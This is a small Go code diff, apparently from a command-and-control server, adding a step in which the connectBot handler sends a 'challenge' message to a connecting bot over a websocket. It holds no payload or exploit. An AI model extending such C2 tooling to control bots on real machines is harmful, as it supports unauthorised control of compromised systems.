@@ -65,6 +65,17 @@ func (c *c2) connectBot(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
+	msgTobot := models.BotMessage{
+		Type:    "challenge",
+		Message: pb.Challenge,
+	}
+
+	err = wsjson.Write(ctx, con, msgTobot)
+	if err != nil {
+		log.Printf("Failed to send challenge to the bot with AgentID %s : %v", pb.Agentid, err)
+		return
+	}
+
 	b.Mu.Lock()
 	b.Con = con
 	b.LastSeen = time.Now()
